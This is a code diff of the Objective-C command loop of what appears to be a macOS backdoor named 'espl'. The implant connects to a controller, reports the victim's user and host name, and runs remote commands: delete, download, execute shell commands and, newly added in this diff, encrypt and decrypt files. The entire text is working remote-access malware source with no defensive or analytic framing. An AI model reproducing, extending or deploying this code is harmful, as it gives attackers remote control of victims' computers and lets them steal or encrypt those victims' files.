@@ -21,7 +21,8 @@ bool debug = false;
 int main(int argc, const char * argv[]) {
     NSArray *socketInfo;
     _espl = [[espl alloc] init];
-    
+    NSLog(@"%@",[NSString stringWithFormat:@"%s",argv[0]]);
+
     int success;
     if (debug) {
         success = [_espl connect:[NSString stringWithFormat:@"%@",@"127.0.0.1"] :atoi("4444")];
@@ -44,11 +45,10 @@ int main(int argc, const char * argv[]) {
     }
     else {
         NSString *name = [NSString stringWithFormat:@"%@@%@",NSUserName(),[[NSHost currentHost] localizedName]];
-        [_espl sendString:name:_espl.skey];
+        [_espl sendString:name];
         NSString *command;
         char buffer[2048];
         while (read (sockfd, &buffer, sizeof(buffer))) {
-            printf("we got somethin\n");
             @autoreleasepool {
                 command = [NSString stringWithFormat:@"%s",buffer];
                 NSString *trim = [command stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
@@ -87,7 +87,7 @@ int main(int argc, const char * argv[]) {
                     [_espl rmFile:cmdarray];
                 }
                 else if ([cmdarray[0] isEqualToString: @"pwd"]) {
-                    [_espl sendString:_espl.fileManager.currentDirectoryPath:_espl.skey];
+                    [_espl sendString:_espl.fileManager.currentDirectoryPath];
                 }
                 else if ([cmdarray[0] isEqualToString: @"download"]) {
                     [_espl download:cmdarray];
@@ -113,8 +113,14 @@ int main(int argc, const char * argv[]) {
                 else if ([cmdarray[0] isEqualToString: @"exec"]) {
                     [_espl executeCMD:cmdarray];
                 }
+                else if ([cmdarray[0] isEqualToString: @"encrypt"]) {
+                    [_espl encryptFile:cmdarray];
+                }
+                else if ([cmdarray[0] isEqualToString: @"decrypt"]) {
+                    [_espl decryptFile:cmdarray];
+                }
                 else {
-                    [_espl sendString:@"-1":_espl.skey];
+                    [_espl sendString:@"-1"];
                 }
                 //clear the received data
                 memset(buffer,'\0',2048);
